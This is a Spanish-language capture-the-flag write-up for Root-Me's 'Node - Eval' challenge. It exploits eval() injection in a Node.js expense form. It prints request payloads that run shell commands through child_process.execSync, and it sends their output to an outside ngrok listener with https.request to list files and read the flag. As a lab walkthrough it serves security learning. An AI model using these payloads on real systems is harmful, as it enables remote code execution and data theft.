🚀 Node - Eval: Writeup Técnico
📌 Información del Reto
Propiedad	Valor
Nombre	Node - Eval
Plataforma	Root-Me
Categoría	Web-Server
Dificultad	Media
Puntos	30
Autor	Mhd_Root
Fecha	24 febrero 2021
Challengeurs	3554
Tasa de éxito	1%
📖 Descripción del Reto

    "Evode Bank es un banco online de nueva generación. Este banco ha creado una herramienta online para atraer a nuevos clientes. ¡Utiliza esta herramienta y encuentra la manera de leer el archivo que contiene la bandera!"

El reto presenta una calculadora de gastos donde el usuario ingresa su salario y varios gastos, y el sistema calcula el remanente.
🎯 Objetivo

Leer el archivo que contiene la bandera mediante una vulnerabilidad de inyección de código en Node.js.
🔍 Fase 1: Reconocimiento
1.1 Análisis de la Aplicación

La aplicación es un formulario HTML con 8 campos numéricos:

    Salary (salario)

    Housing (vivienda)

    Phone/Internet (teléfono/internet)

    Transport (transporte)

    Insurance (seguros)

    Credits (créditos)

    Taxes (impuestos)

    Hobbies/Vacation (ocio/vacaciones)

Cuando se envía el formulario, el servidor devuelve:

    El salario ingresado

    El remanente (salario - total gastos)

1.2 Petición HTTP típica
http

POST / HTTP/1.1
Host: challenge01.root-me.org:59039
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=c18bf10905af4d7cad5d45c9923428dd

salary=2000000&housing=1&phone=10&transport=100&insurance=1000&credits=10000&taxes=100000&hobbies=1000000

1.3 Respuesta del servidor
html

<tr>
    <td class="fromfieldname">Salary :</td>
    <td>
        <input type="text" name="taxes" class="forminput" readonly value="2000000">
    </td>
</tr>
<tr>
    <td class="fromfieldname">Remainder :</td>
    <td>
        <input type="text" name="taxes" class="forminput" readonly value="888889">
    </td>
</tr>

Cálculo confirmado: 2,000,000 - (1 + 10 + 100 + 1000 + 10000 + 100000 + 1000000) = 888,889
🕵️ Fase 2: Prueba de Vulnerabilidad
2.1 Hipótesis

El servidor probablemente usa la función eval() de JavaScript para procesar los campos numéricos, permitiendo operaciones matemáticas avanzadas. Esto abre la puerta a Code Injection.
2.2 Payload de prueba

Enviamos operaciones matemáticas en todos los campos para verificar si eval() está siendo utilizado:
text

salary=5000000+1000000
housing=1+1
phone=10+10
transport=100+100
insurance=1000+1000
credits=10000+10000
taxes=100000+100000
hobbies=1000000+1000000

2.3 Petición HTTP de prueba
http

POST / HTTP/1.1
Host: challenge01.root-me.org:59039
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=c18bf10905af4d7cad5d45c9923428dd
Content-Length: 164

salary=5000000%2B1000000&housing=1%2B1&phone=10%2B10&transport=100%2B100&insurance=1000%2B1000&credits=10000%2B10000&taxes=100000%2B100000&hobbies=1000000%2B1000000

2.4 Evidencia de vulnerabilidad

La respuesta del servidor confirmó que eval() está siendo ejecutado:
html

<tr>
    <td class="fromfieldname">Salary :</td>
    <td>
        <input type="text" name="taxes" class="forminput" readonly value="5000000+1000000">
    </td>
</tr>
<tr>
    <td class="fromfieldname">Remainder :</td>
    <td>
        <input type="text" name="taxes" class="forminput" readonly value="3777778">
    </td>
</tr>

✅ Vulnerabilidad confirmada: El servidor ejecuta eval() en todos los campos del formulario. El cálculo correcto sería:

    Salary: 6,000,000 (5,000,000 + 1,000,000)

    Gastos totales: 2,222,222 (1+1 + 10+10 + 100+100 + ...)

    Remainder: 3,777,778 ✓

💉 Fase 3: Explotación
3.1 Ejecución de comandos

Al tener control sobre eval(), podemos ejecutar código Node.js arbitrario usando child_process.execSync().

Payload inicial:
javascript

require('child_process').execSync('ls -la').toString()

Petición HTTP:
http

POST / HTTP/1.1
Host: challenge01.root-me.org:59039
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=c18bf10905af4d7cad5d45c9923428dd

salary=2000000&housing=require('child_process').execSync('ls -la').toString()&phone=10&transport=100&insurance=1000&credits=10000&taxes=100000&hobbies=1000

3.2 Problema de visualización

El servidor intenta convertir el resultado a número, mostrando NaN (Not a Number) cuando el comando devuelve texto.
html

<tr>
    <td class="fromfieldname">Remainder :</td>
    <td>
        <input type="text" name="taxes" class="forminput" readonly value="NaN">
    </td>
</tr>

3.3 Solución: Exfiltración de datos

Para ver la salida de los comandos, establecemos un servidor de escucha y usamos https.request() para enviar los datos.
📡 Configuración del servidor de escucha

1. Servidor Flask (server.py):
python

from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    print('📩 Datos recibidos:')
    print('Método:', request.method)
    print('Body:', request.data.decode('utf-8'))
    print('---')
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444)

2. Exponer el servidor con Ngrok:
bash

ngrok http 4444

3. URL Ngrok obtenida:
text

https://quintin-nondiffusible-marva.ngrok-free.dev

3.4 Payload de exfiltración
javascript

require('https').request({
    hostname: 'quintin-nondiffusible-marva.ngrok-free.dev',
    port: 443,
    path: '/',
    method: 'POST'
}, r => r.on('data', () => {})).end(
    require('child_process').execSync('ls -la').toString()
)

En formato URL-encoded para el campo housing:
http

POST / HTTP/1.1
Host: challenge01.root-me.org:59039
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=c18bf10905af4d7cad5d45c9923428dd
Content-Length: 300

housing=require('https').request({hostname:'quintin-nondiffusible-marva.ngrok-free.dev',port:443,path:'/',method:'POST'},r=>r.on('data',()=>{})).end(require('child_process').execSync('ls -la').toString())&phone=10&transport=100&insurance=1000&credits=10000&taxes=100000&hobbies=1000

3.5 Resultado de la exfiltración

En el servidor Flask recibimos el listado de archivos:
text

📩 Datos recibidos:
Método: POST
Body: total 96
drwxr-x---  7 web-serveur-ch39 web-serveur-ch39  4096 déc.  11  2021 .
drwxr-s--x 99 challenge        www-data          4096 mars  21  2025 ..
drwxr-x---  2 web-serveur-ch39 web-serveur-ch39  4096 déc.  10  2021 css
-r--------  1 root             root                47 déc.  10  2021 ._firewall
-rw-r-----  1 root             www-data            44 déc.  10  2021 .git
-rw-r-----  1 root             www-data           181 déc.  12  2021 .gitignore
-rwxr-x---  1 web-serveur-ch39 web-serveur-ch39  2287 déc.  10  2021 index.js
-rwxr-x---  1 web-serveur-ch39 web-serveur-ch39   249 déc.  10  2021 Makefile
-r--------  1 challenge        challenge          123 déc.  10  2021 ._nginx.server-level.inc
drwxr-x--- 93 web-serveur-ch39 web-serveur-ch39  4096 déc.  11  2021 node_modules
drwxr-x---  2 web-serveur-ch39 web-serveur-ch39  4096 déc.  11  2021 .npm-packages
-rwxr-x---  1 web-serveur-ch39 web-serveur-ch39   342 déc.  10  2021 package.json
-rw-r-----  1 web-serveur-ch39 web-serveur-ch39 27261 déc.  10  2021 package-lock.json
-r--------  1 root             www-data          2195 déc.  18  2021 ._perms
-rwx------  1 web-serveur-ch39 web-serveur-ch39   173 déc.  10  2021 ._run
dr-x--S---  2 web-serveur-ch39 web-serveur-ch39  4096 déc.  10  2021 S3cr3tEv0d3f0ld3r
-rwxr-x---  1 web-serveur-ch39 web-serveur-ch39    78 déc.  10  2021 ._test
drwxr-x---  2 web-serveur-ch39 web-serveur-ch39  4096 déc.  10  2021 views

🔑 Fase 4: Obtención de la Bandera
4.1 Identificación de la carpeta sospechosa

Notamos una carpeta con nombre extraño: S3cr3tEv0d3f0ld3r (SecretEvodeFolder)
4.2 Listar el contenido de la carpeta

Payload:
http

POST / HTTP/1.1
Host: challenge01.root-me.org:59039
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=c18bf10905af4d7cad5d45c9923428dd

housing=require('https').request({hostname:'quintin-nondiffusible-marva.ngrok-free.dev',port:443,path:'/',method:'POST'},r=>r.on('data',()=>{})).end(require('child_process').execSync('ls -la S3cr3tEv0d3f0ld3r').toString())&phone=10&transport=100&insurance=1000&credits=10000&taxes=100000&hobbies=1000

4.3 Resultado

En el servidor Flask recibimos:
text

📩 Datos recibidos:
Método: POST
Body: total 12
dr-x--S--- 2 web-serveur-ch39 web-serveur-ch39 4096 déc.  10  2021 .
drwxr-x--- 7 web-serveur-ch39 web-serveur-ch39 4096 déc.  11  2021 ..
-r-------- 1 web-serveur-ch39 web-serveur-ch39   21 déc.  10  2021 Ev0d3fl4g

¡Encontramos el archivo de la bandera! → Ev0d3fl4g
4.4 Lectura de la bandera

Payload final:
http

POST / HTTP/1.1
Host: challenge01.root-me.org:59039
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=c18bf10905af4d7cad5d45c9923428dd

housing=require('https').request({hostname:'quintin-nondiffusible-marva.ngrok-free.dev',port:443,path:'/',method:'POST'},r=>r.on('data',()=>{})).end(require('child_process').execSync('cat S3cr3tEv0d3f0ld3r/Ev0d3fl4g').toString())&phone=10&transport=100&insurance=1000&credits=10000&taxes=100000&hobbies=1000

4.5 ¡Bandera obtenida!

En el servidor Flask recibimos:
text

📩 Datos recibidos:
Método: POST
Body: ************************

🏆 FLAG: ******************
📊 Resumen del Ataque
Fase	Acción	Resultado
1	Reconocimiento	Identificación del formulario y su funcionamiento
2	Prueba de vulnerabilidad	Confirmación de eval() con operaciones matemáticas
3	Ejecución de comandos	Uso de child_process.execSync()
4	Exfiltración	Configuración de servidor Flask + Ngrok
5	Exploración	Listado de archivos y descubrimiento de carpeta oculta
6	Obtención	Lectura del archivo Ev0d3fl4g
🛠️ Herramientas Utilizadas

    Burp Suite / curl - Para enviar peticiones HTTP personalizadas

    Flask - Servidor HTTP para recibir datos exfiltrados

    Ngrok - Exposición del servidor local a Internet

    Node.js - Ejecución de código en el servidor vulnerable
